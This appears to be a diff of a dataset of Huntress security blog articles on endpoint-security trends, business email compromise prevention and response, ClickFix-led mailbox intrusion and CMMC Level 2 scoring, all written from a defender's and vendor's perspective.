+4. Be aware of EDR to XDR platform consolidation
+
+Trend: Blending security layers under one roof can enhance visibility, but not if complexity muddies the waters.
+
+As digital environments become more complex, many security teams are looking beyond standalone EDR to extended detection and response (XDR), which pulls in signals from endpoints, email, identities, and cloud workloads.
+
+The idea is to correlate events across these layers so you can spot patterns that might not stand out when each system is viewed in isolation.
+
+Consolidation, though, shouldn’t come at the expense of clarity. This broader view can introduce tool fatigue for smaller teams unless it comes from an all-in-one solution.
+
+What XDR Can Help You Do
+
+Where Teams Still Get Tripped Up
+
+Correlate events across endpoints, email, identity, and cloud
+
+Overloading small teams with more data than they can review
+
+Spot multi-stage attacks that span multiple systems
+
+Relying on complex dashboards without clear guidance
+
+Reduce blind spots between separate security tools
+
+Assuming a single point of visibility equals full coverage
+
+Simplify licensing and vendor relationships
+
+Neglecting core risks like compromised endpoints and phished credentials
+
+The majority of successful attacks still start with a handful of familiar paths:
+
+Compromised endpoints
+
+Phished credentials
+
+Malicious email
+
+The Huntress Managed Security Platform focuses on securing these primary threat vectors. In return, you get deeper visibility where attackers are most likely to strike, without drowning in a bloated toolset you don’t have time to manage.
+
+5. Focus on identity-first security and zero-trust architecture
+
+Trend: Perimeters have dissolved, and identities are the new battleground. Securing logins and access credentials is now central to protecting every endpoint.
+
+With so many apps in the cloud, identity has become the real perimeter. The best phishing protection guards identities to keep them out of the wrong hands.
+
+Threat actors often find it easier to steal or phish credentials than to exploit a local vulnerability. Then, they use those stolen accounts to blend in with normal activity. That’s why identity-first security and zero trust architecture (ZTA) are now central to modern security strategies.
+
+ZTA doesn’t grant long-lived trust. It assumes every session could be risky and leans on continuous verification, like repeatedly checking on:
+
+Device health
+
+User behavior
+
+Usage context
+
+Managed identity threat detection and response (ITDR) builds on that by watching for post-compromise behavior, like unusual logins and multi-factor authentication (MFA) fatigue.
+
+When ITDR works alongside EDR, your team can spot both the compromised laptop and the compromised account it’s impersonating. It strengthens detection across every layer of your environment and closes the gaps attackers rely on.
+
+6. Treat your supply chain as a major initial access risk
+
+Trend: Attackers are exploiting trusted vendors, turning supply chains into backdoors for compromise.
+
+The software and service providers your business relies on can become stepping stones for attackers.
+
+High-profile incidents like the Kaseya supply chain attack show how compromising one vendor can give broad access to hundreds or thousands of downstream environments. That risk has only amplified with automation and remote tooling, making these relationships even more attractive to bad actors.
+
+Protecting your endpoints now means monitoring how connected systems behave, which includes:
+
+Locking down remote management tools
+
+Enforcing least privilege for third-party access
+
+Pairing vulnerability management with continuous monitoring
+
+This is all to ensure unusual behavior from a trusted vendor doesn’t slip by. Even if you can’t control every partner’s security posture, you can watch how tools behave on your endpoints and be ready to contain abuse quickly.
+
+Quick Checks for Vendor-Related Endpoint Risk
+
+Ask vendors how they secure remote access tools and admin accounts.
+
+Limit vendor access to only the systems they truly need.
+
+Require MFA and strong logging for all third-party connections.
+
+Review vendor activity regularly for unusual sign-ins or changes.
+
+7. Ride the wave of posture management
+
+Trend: Misconfigurations are still the easiest way for attackers to get in. Fixing small mistakes prevents big breaches.
+
+Endpoint security posture management helps find and fix these configuration issues at scale. These tools also keep an eye out for drift as settings change over time.
+
+For many businesses, tying this to dedicated Microsoft 365 security monitoring is key. They need to watch for risky settings and data access patterns that might indicate someone is abusing those misconfigurations
+
+Misconfigurations in Microsoft 365 and other cloud services and productivity platforms are a quiet but consistent source of breaches. Attackers are more than happy to walk through open doors left by occurrences like:
+
+Over-permissive sharing
+
+Weak access rules
+
+Ineffective legacy protocols
+
+8. Prevent alert fatigue and close skill gaps
+
+Trend: Even the best tools fail if security teams drown in alerts or lack the time to respond effectively.
+
+Security tools can generate an overwhelming amount of data. It’s common for small or mid-sized teams to see thousands of alerts per day across EDR, email security, identity platforms, and cloud services. With a lean staff, this can lead to alert fatigue. People either tune out the noise or burn out trying to keep up.
+
+A human-led 24/7 managed SOC like Huntress can make that data workable.
+
+Instead of expecting your team to triage every event, you can count on security experts to investigate alerts, confirm or dismiss threats, contain and remediate threats, and provide guidance to bolster defenses when something is actually wrong.
+
+That support closes skill gaps, reduces time-to-response, and lets your in-house team focus on projects that move the business forward instead of living in alert queues.
+
+9. Look for stealthy living off the land (LotL) attacks
+
+Trend: Attackers are hiding in plain sight, using your own tools to evade detection.
+
+More attackers are skipping traditional endpoint security threats like malware and turning to LotL techniques like living off the land binaries, or LOLBins. They’re using built-in tools like PowerShell, Windows Management Instrumentation (WMI), and command-line utilities to do their dirty work.
+
+Because these tools are part of normal Windows environments, their activity can blend in easily if you’re only watching for known malicious files or signatures.
+
+Detecting LotL activity takes endpoint visibility plus context from a human who knows what normal looks like for your environment. That might mean actions like:
+
+Flagging an unusual PowerShell script launched by a user who rarely uses the command line
+
+Spotting a lateral movement tool running from a workstation that has no business doing remote admin work
+
+These are subtle clues, but they often surface well before data is encrypted or exfiltrated. Download our LOLBins Attack Playbook to learn how to spot these attacks and shut them down.
+
+10. Tighten security on all your IoT and OT devices
+
+Trend: IoT and OT devices are expanding the attack surface faster than security can keep pace.
+
+Think about smart cameras, printers, sensors, badge readers, and industrial controllers. They're all part of the endpoint landscape these days, even if they aren't running standard security agents. And your business needs endpoint protection across all of your endpoints, not just the obvious ones.
+
+A lot of these IoT and OT devices don't have strong security built in, or they ship with insecure default settings that people rarely bother to change.
+
+Instead of trying to run endpoint agents everywhere, isolate these devices with network segmentation so these systems have limited access to critical assets and can’t freely talk to everything else. Then, monitor the systems they communicate with using managed EDR.
+
+That way, in IoT cybersecurity instances, you still see the lateral movement and can respond before real damage is done.
+
+Overcome endpoint security challenges today and tomorrow with Huntress
+
+To get better endpoint security, it’s helpful to remember the clear patterns in these trends. The businesses that stay ahead combine practical tools and processes with trusted partners who can help them respond when something slips through.
+
+Huntress gives you fully managed EDR backed by AI-assisted 24/7 SOC analysts who understand how threat actors think and what their activity looks like in real environments.
+
+If you’re ready to dig deeper, check out the Huntress resources in our EDR Guide to learn more about Huntress Managed EDR and how it helps you contain threats around the clock.
+
+FAQ
+
+What risks and threats does endpoint security protect against?
+
+Endpoint security helps protect against:
+
+Ransomware
+
+Infostealers
+
+Malicious scripts
+
+Unauthorized remote access
+
+Trojan malware
+
+Other threats that can lead to data loss or business disruption
+
+It also helps you spot lateral movement and suspicious behavior before attackers reach high-value systems.
+
+What are the primary types of endpoint security?
+
+Common endpoint security layers include:
+
+Antivirus
+
+EDR
+
+Host-based firewalls
+
+Device control
+
+Application control
+
+Vulnerability management
+
+Managed detection and response service
+
+Many businesses also pair these with identity-focused tools like ITDR and security awareness training for a more complete picture of risk.
+
+How is endpoint security different from antivirus software?
+
+Antivirus focuses mainly on detecting and blocking known malware, often using signatures or simple heuristics.
+
+Endpoint cybersecurity covers a wider range of protections, including behavioral monitoring, incident investigation, response actions, and long-term visibility into what’s happening on each device.
+
+How does endpoint detection and response fit into endpoint security?
+
+EDR is a core part of modern endpoint security because it continuously monitors endpoints, records activity, and helps detect suspicious behavior that traditional tools miss.
+
+A managed service like Huntress Managed EDR gives you 24/7 experts who can investigate threats and guide response when something goes wrong. Talk to Huntress today to see how we can help you defend all of your endpoints."
+4153f0597cd3,4153f0597cd3,2026-10-14 16:00 UTC,"Attacks, Breaches & Threat Intel",Huntress,Huntress Blog,Email and Collaboration Security; Threat Intelligence; AI Security; Identity Security Posture Management,Article,Business Email Compromise (BEC) Attacks: How to Stop Them,https://www.huntress.com/blog/what-is-business-email-compromise-bec,"Our survey of more than 500 US IT professionals found that 36% of organizations experienced a BEC attack in the past 12 months, making it the third-most-reported type of...","Business email compromise (BEC) is a phishing scam where threat actors impersonate a trusted source to convince others to give them sensitive information or take specific action.
+
+Among the threats targeting businesses of all sizes today, business email compromise is a particularly growing concern, and for good reason.
+
+Business email compromise (BEC) is a type of cybercrime where threat actors seek to manipulate or compromise email accounts within an organization to commit fraudulent activities like wire fraud and credential theft. In simple terms, a BEC attack uses email impersonation to commit fraud, usually to redirect a payment or steal login credentials.
+
+These attacks result in some $55 billion in losses worldwide, and that number is expected to rise. Our survey of more than 500 US IT professionals found that 36% of organizations experienced a BEC attack in the past 12 months, making it the third-most-reported type of cybercrime (behind malware infections and phishing). The primary suspected motivation is financial gain, cited by 27% of respondents, which is exactly what BEC attacks are engineered to deliver.
+
+Let’s dive into the world of business email compromise, explore what a BEC attack is, how it works, and learn practical tips for defending against BEC attacks.
+
+Table of contents
+
+How do business email compromise attacks work?
+
+Warning signs of a BEC attack
+
+Types of business email compromise scams
+
+Real-world BEC attack examples
+
+How to prevent business email compromise
+
+How Huntress stops business email compromise
+
+How do business email compromise attacks work?
+
+BEC attacks work by impersonating a trusted source through email to trick employees or organizations into sending money or sensitive information.
+
+Threat actors create these emails, often with help from generative AI tools that quickly and efficiently make the content look legitimate and mimic the tone and writing style of people you trust. This makes it hard for recipients to tell the difference between legitimate emails and scams.
+
+The AI piece is only getting harder to ignore. Our Cybercrime Report found that 38% of IT professionals consider AI-powered social engineering the biggest unanticipated risk to their organization, and 42% believe AI-powered attacks will be the biggest game-changer in cybercrime over the next five years. BEC is a natural fit for AI-driven tactics, since the attacks rely on impersonation and manufactured trust.
+
+BEC attacks typically follow a structured path, from reconnaissance to impersonation and fraud:
+
+Research and reconnaissance: Attackers gather information about their targets, like names, roles, and relationships within the organization.
+
+Adversary-in-the-middle (AiTM) attacks: These attacks help attackers gather information about your organization, login credentials, and other sensitive data. Attackers place themselves between you and whatever you’re trying to access, like a web page or service, letting them monitor your activity before moving on to the next step.
+
+Email compromise or account takeover: Attackers gain access and essentially take over an email account. They often do this through phishing email scams, social engineering, or exploiting software vulnerabilities.
+
+Impersonation: The attacker impersonates a trusted person at the organization, like a CEO, CFO, or vendor, using a spoofed or compromised email account.
+
+Deception: Threat actors send convincing emails to trick employees into transferring money, sharing sensitive information, or downloading malicious attachments.
+
+BEC attacks rely heavily on social engineering techniques to identify potential targets, executives, or trusted contacts to mimic or hijack their communications. The attack emails often look legitimate at first glance, and without closely scanning the address, contact information, and other details, recipients may not recognize the emails as suspicious.
+
+As a result, these attacks are difficult to detect or prevent with traditional security tools or spam filtering. The goal is to trick employees into giving sensitive information or transferring money freely without making them doubt the legitimacy of the request.
+
+Looking to brush up on your security savvy? Explore the Huntress Cybersecurity Glossary for all things cyber safety.
+
+Warning signs of a BEC attack
+
+Preventing BEC attacks from hitting your inbox is possible, but even the most well-guarded business email system may see one or two BEC attacks slip through the cracks. You can avoid falling victim to these attacks by knowing what to watch for.
+
+Here are the warning signs most BEC attacks have in common:
+
+Rampant typos: If the email misspells company names and contacts or contains tons of errors that your clients, customers, and team members wouldn’t make, it’s likely a scam.
+
+Suspicious requests: BEC attacks often make requests that aren’t common or sound suspicious, like asking you to communicate on a third-party app like WhatsApp, share your login credentials, or make gift card purchases.
+
+Forced urgency: Threat actors often use phrases like “quick” or “urgent” to imply that the email is important and needs a response immediately.
+
+Generic terms and names: BEC attacks often use generic terms or titles rather than specific names or terms unique to your business.
+
+Fake personal email addresses: Scammers may also pretend to be a business executive or manager by using a fake personal email address that mimics a real address.
+
+Review any unfamiliar or unexpected emails closely. If you see anything that looks suspicious or doesn’t feel legitimate, don’t reply.
+
+“BEC attacks rely on humans to perform actions on behalf of attackers,” says Truman Kain, Offensive Security Researcher at Huntress. “Employees need to understand that even emails from legitimate internal addresses can be sent by attackers. Your inbox is not a safe place.”Instead of replying to the message, speak with the person the email supposedly came from directly by sending a new email through their company email address or talking to them in person or over the phone.
+
+Types of business email compromise attacks
+
+BEC attacks can take many forms, and as technology improves, new scams and types of attack vectors will become more popular. But some common tactics include:
+
+Invoice scams: Attackers compromise a supplier's or vendor's email account and send altered invoices or payment instructions to customers. The altered details then send payments to the attacker's account—and the legit vendor is left empty-handed.
+
+CEO fraud: Attackers impersonate a high-level executive and ask for urgent wire transfers or sensitive data from employees. Employees are tricked into making payments or even purchasing gift cards, believing it's a legitimate request from their boss.
+
+Payroll diversion: There are two types of payroll diversion scams. In the first, attackers pose as HR personnel and request changes to an employee's direct deposit information. In the second, attackers pose as the actual employee requesting that their own direct deposit information be updated. As a result, the employee's salary is redirected to the attacker's account.
+
+Voice cloning: Attackers use AI tools to mimic the sound and tone of a business leader’s voice on a phone call or in a virtual meeting to phish for information or get someone to take a specific action.
+
+Email spoofing: Scammers create email addresses similar enough to legitimate addresses to appear real at a glance. They often use these addresses to request money or sensitive information.
+
+Gift card scams: Attackers send emails or text messages to employees requesting that they buy digital gift cards and send them to the attacker-controlled email address or phone number.
+
+Account compromise: Attackers send emails notifying employees that their accounts have been compromised and request that they do things like reset passwords through a phishing link to prevent further suspicious activity on the account.
+
+Attorney impersonation: Attackers pretend to be a lawyer or attorney requesting information from an employee who may not know to question the legitimacy of the request.
+
+Data theft: Attackers pose as new employees or vendors requesting access to sensitive information about executives in the company.
+
+Any of these tactics can combine the use of AI tools to create deepfakes that make requests seem more legitimate. Encourage your team to use their best judgment and ask them to verify any questionable email or phone call by reaching out to the sender through company channels before sending any sensitive information.
+
+Real-world BEC attack examples
+
+BEC attacks might seem theoretical if you’ve never experienced one. But they’ve done a lot of damage in the past. These high-profile BEC attacks cost businesses millions in the last 10 years:
+
+Children’s Healthcare of Atlanta: An attacker targeted the organization by pretending to be a construction company’s chief financial officer. The attack resulted in $3.6 million in damages.
+
+Facebook and Google: Scammers impersonated a legitimate hardware provider and sent emails to Facebook and Google requesting payment for products. The scam cost Facebook and Google more than $100 million.
+
+Toyota Boshoku Corporation: Attackers requested funds transfers without the organization realizing the requests were fake. It cost Toyota more than $37 million.
+
+Grand Rapids Public Schools: Attackers impersonated the district’s health insurance provider and emailed the school administration requesting that they change wiring information for upcoming payments, sending the insurance payments into the scammers’ accounts. It cost the district $2.8 million.
+
+For more cases and what each one teaches, see our full list of business email compromise examples. Even a single attack could end up costing businesses a lot of money—and it’s hard to get that money back once the scammers take possession of it.
+
+How to prevent business email compromise
+
+Because BEC attacks are generally human-centric, protection and prevention methods must also be human-centric. Check out these tips to help you keep your employees and your company’s information safe from bad actors:
+
+Host security awareness training sessions: Conducting regular security awareness training can help educate employees about the dangers of BEC attacks, how to recognize them, and how to avoid becoming victims.
+
+Use multi-factor authentication (MFA): Implementing MFA adds an extra layer of security to email accounts, making it more challenging for attackers to gain access.
+
+Verify payment changes out of band: Confirm any new or changed banking details with a phone call to a known number, never a number listed in the email.
+
+Implement managed identity threat detection and response (ITDR): ITDR solutions proactively monitor for and detect anomalies, including looking for behavioral indicators of BEC, like suspicious inbox rules or login attempts from unusual locations.
+
+Invest in a secure payment system: Rather than sending invoices through email, upgrade your payment collections system to a dedicated service. Make sure the system can authenticate payments and only accept payments through that portal.
+
+BEC attack tactics are constantly evolving, but by being proactive with BEC security awareness training sessions, businesses can better protect their sensitive information well into the future.
+
+“Regular simulated phishing exercises maintain a higher security awareness baseline for employees versus those without exposure to the exercises,” says Kain. “Additionally, phishing simulations and educational episodes highlight the newest and most topical threats that employees are likely to face, for example fake CAPTCHA attacks or deepfakes.”
+
+While the BEC threat is real, it's not insurmountable. By understanding attackers' tactics and implementing proactive measures, businesses can be better prepared to face today’s email and identity-based attacks.
+
+How Huntress stops business email compromise
+
+Business email compromise threats will only become more common as more attackers take advantage of weak points in companies’ data security efforts. By training your team and taking the necessary precautions, you can keep your data safe well into the future.
+
+Huntress Managed ITDR detects the behaviors behind BEC, like suspicious inbox rules, logins from unusual locations, and session hijacking, and our 24/7 SOC responds before attackers can move money. Pair it with Huntress Security Awareness Training to help employees spot the lures that get through. See how Huntress stops BEC.
+
+Don't face BEC threats alone. Huntress has your back.
+
+FAQs on BEC
+
+What is the difference between BEC and phishing?
+
+Phishing is a broad tactic; fake messages sent to trick people into clicking a link, opening an attachment, or handing over credentials. BEC is a targeted type of phishing. Instead of casting a wide net, attackers research a specific organization, then impersonate or take over a trusted account, like a CEO, vendor, or HR contact, to request money or sensitive data. Many BEC emails contain no links or malware at all, which is why they slip past email filters built to catch traditional phishing.
+
+How is AI changing business email compromise attacks?
+
+AI makes BEC attacks faster to launch and harder to spot. Generative AI tools can write polished, error-free emails that copy the tone and writing style of the person being impersonated, so the typos that used to give scams away are disappearing. Attackers also use voice cloning and deepfakes to back up email requests with a phone call or video meeting. That’s why verifying requests through a separate, trusted channel matters more than ever.
+
+Can MFA stop business email compromise?
+
+MFA makes account takeover much harder, but it can’t stop BEC on its own. Attackers use adversary-in-the-middle (AiTM) phishing kits to steal session tokens after a user completes MFA, and many BEC scams don’t need account access at all because they rely on spoofed addresses. For stronger protection, combine phishing-resistant MFA (like passkeys or FIDO2 security keys) with ITDR and security awareness training.
+
+What should you do after a BEC attack?
+
+Treat it like a live intrusion, not just a bad email. The attacker may still be in the account, so contain first and investigate second.
+
+Cut off access. Revoke all active sessions and refresh tokens, then reset the password. A password reset alone won’t remove an attacker who already holds a valid session token.
+
+Remove what they left behind. Attackers rarely just read email. Look for the new inbox rules that hide, delete, or forward messages along with external forwarding addresses, MFA devices registered to someone unknown, and OAuth app grants nobody approved. Remove anything you can’t explain.
+
+Find out how they got in. Review sign-in logs for unusual locations, VPN or hosting provider IPs, and logins that happened at “impossible travel” speeds. Look for a phishing email or AiTM sign-in page around the time of first access.
+
+Figure out what they touched. Check sent items, deleted items, and mailbox audit logs for emails sent as the user, files accessed, and conversations they inserted themselves into, especially anything involving invoices or payment details.
+
+Check whether they spread to other accounts. Compromised mailboxes are often used to phish coworkers and partners, so review accounts that got messages from the compromised user.
+
+Escalate the money side right away. If any payment went out, call your bank immediately to request a recall, and file a report with the FBI’s IC3. Speed matters more here than anywhere else.
+
+Warn anyone who might act on a fake request. Tell finance, vendors, and customers who were in contact with the account to verify any recent payment changes by phone.
+
+Steps 1 and 2 matter most. If you skip them, the attacker can walk right back in while you’re still investigating."
 155ee6f2f50e,155ee6f2f50e,2026-10-14 16:00 UTC,General Security News,Huntress,Huntress Blog,Email and Collaboration Security; AI Security; Threat Intelligence; Endpoint Security,Article,What Cybersecurity Leaders Must Prioritize in 2027,https://www.huntress.com/blog/what-does-the-future-hold-for-todays-cybersecurity-leaders,"Identity attacks and business email compromise (BEC) This is the threat that breaks the traditional security model most completely, because there's often no malware, no exploit,...","The challenges of 2025, tight budgets, rising AI anxiety, and increasingly organized cybercrime, didn't go away. They matured. The threat landscape of 2026 is sharper, faster, and more brazen than what we faced previously, and the leaders navigating it deserve an honest, updated picture.
 
 So let's talk about where things actually stand and what you can do about it.
@@ -4646,7 +5558,7 @@ Collector hosting, Omegatech LTD (AS202412), Amsterdam
 popup.js
 
 Credential capture modal script; fields server, login, password, attempt"
-9e280db60d2d,9e280db60d2d,2026-10-13 07:00 UTC,General Security News,Huntress,Huntress Blog,Email and Collaboration Security; Identity Security Posture Management; AI Security,Article,ClickFix to BEC in 24 Hours: Tragic Quadrant | Huntress,https://www.huntress.com/blog/clickfix-bec-tragic-quadrant-doris,Threats like AI platform abuse and ClickFix-style attacks on their own can feel like small problems,"Most cyber threats start out small and unassuming before they turn into the OH $#!T moments that put your whole business at risk. They can creep up fast during a normal day with a website you trust and a habit you don't question. You ask your favorite AI platform for help, follow ""fix it"" instructions when it hits a snag, and get back to work without thinking twice.
+9e280db60d2d,1addd2ae661e,2026-10-13 07:00 UTC,General Security News,Huntress,Huntress Blog,Email and Collaboration Security; Identity Security Posture Management; AI Security,Article,ClickFix to BEC in 24 Hours: Tragic Quadrant | Huntress,https://www.huntress.com/blog/clickfix-bec-tragic-quadrant-doris,Threats like AI platform abuse and ClickFix-style attacks on their own can feel like small problems,"Most cyber threats start out small and unassuming before they turn into the OH $#!T moments that put your whole business at risk. They can creep up fast during a normal day with a website you trust and a habit you don't question. You ask your favorite AI platform for help, follow ""fix it"" instructions when it hits a snag, and get back to work without thinking twice.
 
 Nothing feels risky on the surface. But underneath, the ""normal"" AI search result you clicked and the ""fix it"" instructions you followed just helped an attacker gain access to your Microsoft 365 account. While you move on to the next task in your day, they walk straight into your inbox without a password or MFA prompt, looking just like you. They read through your messages and create hidden inbox rules that hide their tracks. That stealthy intrusion is mailbox manipulation, and in this case, it can escalate into full-blown business email compromise (BEC) within hours.
 
@@ -4691,42 +5603,3 @@ Watch the Tragic Quadrant livestream to see how small threats stack up to OH $#!
 Grab the Tragic Quadrant report to get a full readout of which cyber threats to find and fix first.
 
 Then, step into Doris' shoes with our Defense Drill and walk through the same custom GPT, ClickFix, and sneaky inbox activity to see if you'd catch the attack before any damage is done."
-348afdb9df65,348afdb9df65,2026-10-12 14:00 UTC,"Policy, Legal & Compliance",Huntress,Huntress Blog,Compliance Management,Article,CMMC Level 2 Non-Negotiable Requirements Explained | Huntress,https://www.huntress.com/blog/cmmc-level-2-non-negotiable-requirements,This means your only real flexibility when achieving CMMC Level 2 is deciding which 24 (of the remaining 46) one-point requirements you'll implement to reach a minimum score of...,"Differences between legacy self-assessments (DFARS 252.204-7019) and CMMC Level 2 self-assessments (DFARS 252.204-7021) are leading defense contractors to a rude awakening: they no longer dictate the requirements they can implement or defer during a NIST 800-171 implementation. Identifying the “non-negotiable” requirements dictated by the CMMC program avoids future scenarios where a single missing requirement voids contract award eligibility or exposes the organization to the False Claims Act.
-
-Old vs. New CMMC Level 2 Requirements
-
-Self-assessments performed under the DFARS 252.204-7019 (Notice of NIST SP 800-171 DoD Assessment Requirements) and DFARS 252.204-7020 allowed contractors to report any score, ranging from a ""haven't even started"" score of -203 to a perfect 110 points, using the DoD Assessment Methodology (DoDAM).
-
-CMMC Level 2 self-assessments are scored using the DOD CMMC scoring methodology, and DFARS 252.204-7997 (which replaces both 252.204-7019 and 252.204-7020 under the DFARS overhaul) now points government DIBCAC assessments at that same methodology.
-
-The real difficulty emerges when you pair CMMC point values with self-assessment requirements from the DFARS 252.204-7021 CMMC clause. Now your CMMC self-assessment has a minimum score that isn't evident in the contract clause language itself.
-
-The New Bare Minimum
-
-Completing a CMMC Level 2 self-assessment uses the same assessment objectives and point values as previous self-assessment procedures, but there are some tough mandates buried in 32 CFR 170.21, which sets the bar for a Conditional Level 2 (Self) status:
-
-Your self-assessment score must be at least 80% of the 110 requirements in the model, or 88
-
-You must implement all requirements worth three (3) or five (5) points
-
-Additionally, a short list of one point requirements must also be implemented
-
-These non-negotiable requirements from NIST 800-171 yield a self-assessment score of 64, and represent 85% of all possible points in the scoring methodology. This means your only real flexibility when achieving CMMC Level 2 is deciding which 24 (of the remaining 46) one-point requirements you'll implement to reach a minimum score of 88 on your first self-assessment submitted to the Department's Supplier Performance Risk System (SPRS).
-
-A Ticking Clock
-
-With 32 CFR 170.21 putting a new floor on minimum compliance, it's important to understand how quickly the ""ceiling"" approaches because of how ""POA&M closeout"" works in the CMMC rules. Under CMMC self-assessment requirements, submitting a CMMC Level 2 self-assessment with any unmet requirements kickstarts a 180-day period to close out those remaining items. Failing to complete those items and update CMMC Status in SPRS will cause that Conditional status to expire after 180 days.
-
-Any contractor submitting a less-than-perfect Level 2 self-assessment should be aware of this mechanism, since it causes self-assessments to expire earlier than normal. Don't end up in a situation where your affirming official logs into SPRS to submit their annual affirmation, only to find your self-assessment has expired, silently disqualifying the company for bids they may have submitted during that timeframe.
-
-How Huntress Helps
-
-Some NIST 800-171 requirements call for specialized capabilities—not just written policies—including ongoing system monitoring, security-event logging and review, threat detection, and incident handling. Huntress brings together endpoint and identity detection and response, security-event collection and retention, and 24/7 SOC monitoring to help organizations operationalize requirements across audit and accountability, incident response, security-control monitoring, and system integrity. We also map our products to applicable CMMC controls and provide assessor-ready documentation, but each organization must still configure these capabilities for its environment, integrate them into its response processes, and maintain evidence that each in-scope requirement is met.
-
-Of the 55 requirements currently documented in Huntress CMMC resources: 32 are non-negotiable. Overall, the requirements addressed in the Huntress Shared Responsibility Matrix (SRM) add up to 164 points in the Level 2 scoring methodology, or 52 percent of all possible points.
-
-As we launch new capabilities, expect Huntress to contribute towards more 800-171 requirements and yield more possible points.
-
-Conclusion
-
-When a solicitation or contract requires CMMC Level 2 (Self), a current Level 2 (Self) status and an affirmation in SPRS are a condition of contract award, and that status will require an implementation score of at least 88 with every non-POA&M-able requirement met. Contractors should respond to this heightened requirement quickly, completing NIST 800-171 implementations and submitting new CMMC Level 2 (Self) assessment in SPRS before the lack of an assessment entry costs them a contract award or contract option."
